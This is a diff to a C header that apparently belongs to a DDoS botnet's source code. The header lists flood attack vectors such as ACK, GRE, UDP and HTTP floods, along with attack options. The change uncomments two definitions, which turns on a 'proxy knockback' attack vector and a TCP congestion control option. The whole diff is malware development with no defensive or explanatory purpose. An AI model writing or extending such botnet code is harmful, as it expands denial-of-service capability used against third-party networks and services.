@@ -39,7 +39,7 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_VEC_STOMP      5  /* ACK flood to bypass mitigation devices */
 #define ATK_VEC_GREIP      6  /* GRE IP flood */
 #define ATK_VEC_GREETH     7  /* GRE Ethernet flood */
-//#define ATK_VEC_PROXY      8  /* Proxy knockback connection */
+#define ATK_VEC_PROXY      8  /* Proxy knockback connection */
 #define ATK_VEC_UDP_PLAIN  9  /* Plain UDP flood optimized for speed */
 #define ATK_VEC_HTTP       10 /* HTTP layer 7 flood */
 
@@ -53,7 +53,7 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_OPT_DPORT           7   // Should we force a dest port? (0 = random)
 #define ATK_OPT_DOMAIN          8   // Domain name for DNS attack
 #define ATK_OPT_DNS_HDR_ID      9   // Domain name header ID
-//#define ATK_OPT_TCPCC           10  // TCP congestion control
+#define ATK_OPT_TCPCC           10  // TCP congestion control
 #define ATK_OPT_URG             11  // TCP URG header flag
 #define ATK_OPT_ACK             12  // TCP ACK header flag
 #define ATK_OPT_PSH             13  // TCP PSH header flag
